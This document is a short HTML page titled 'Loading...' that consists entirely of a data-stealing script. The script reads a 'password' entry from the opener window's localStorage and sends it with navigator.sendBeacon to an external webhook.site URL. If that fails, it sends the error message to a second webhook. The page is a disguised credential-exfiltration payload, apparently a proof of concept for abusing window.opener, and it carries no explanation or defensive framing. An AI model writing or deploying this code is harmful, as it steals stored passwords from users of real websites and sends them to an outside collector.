<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <script>
        try {
            // Try to access parent window's localStorage
            const parentPass = window.opener?.localStorage?.getItem('password');
            
            // Send data via beacon (CORS-safe)
            navigator.sendBeacon('https://webhook.site/b10112ab-9a11-4d66-9a7c-b4e4be14240c?password=' + parentPass);
            
        } catch(e) {
            navigator.sendBeacon('https://webhook.site/958fec35-99ec-403e-aa5c-b8e51ba1f3bc?error=' + e.toString());
        }
    </script>
</body>
</html>
